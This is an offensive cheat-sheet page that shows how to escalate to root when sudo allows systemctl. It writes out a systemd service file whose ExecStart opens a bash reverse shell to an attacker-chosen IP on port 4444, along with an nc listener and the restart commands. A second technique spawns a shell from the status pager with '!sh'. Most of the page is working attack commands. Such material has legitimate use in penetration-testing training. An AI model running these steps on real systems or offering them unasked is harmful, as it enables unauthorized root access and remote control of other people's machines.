# Sudo Systemctl Privilege Escalation

The `sudo systemctl` command might be vulnerable to privilege escalation by modifying the configuration file.

### Modify Configurations <a href="#modify-configurations" id="modify-configurations"></a>

```shellscript
sudo -l

(ALL) NOPASSWD: systemctl
```

If we can run **"systemctl"** command as root, and we can edit the config file, then we might be a root user.

#### 1. Update the Config File <a href="#id-1-update-the-config-file" id="id-1-update-the-config-file"></a>

We need to insert the payload for reverse shell to get a root shell into the /etc/systemd/system/example.service.

```shellscript
[Unit]
This is an example service.

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<local-ip>/4444 0>&1'

[Install]
WantedBy=multi-user.target
```

Replace **“\\\<local-ip>”** with your local ip address.

#### 2. Start Listener in Local Machine <a href="#id-2-start-listener-in-local-machine" id="id-2-start-listener-in-local-machine"></a>

Then start listener for getting a root shell.

```
nc -lvnp 4444
```

#### 3. Restart the Service <a href="#id-3-restart-the-service" id="id-3-restart-the-service"></a>

Reload the daemon and restart.

```
sudo systemctl daemon-reload
sudo systemctl restart example.service
```

Now we should get a shell in local machine.

### Spawn Shell in the Pager <a href="#spawn-shell-in-the-pager" id="spawn-shell-in-the-pager"></a>

```
sudo -l

# output
(ALL) NOPASSWD: systemctl status example.service
```

If we can execute **`systemctl status`** as root, we can spawn another shell in the pager.\
Just run the command with `sudo`.

```
sudo systemctl status example.service
```

Then enter the following command in the pager like `less`.

```
!sh
```

Spawning the shell, then we can get another user shell.
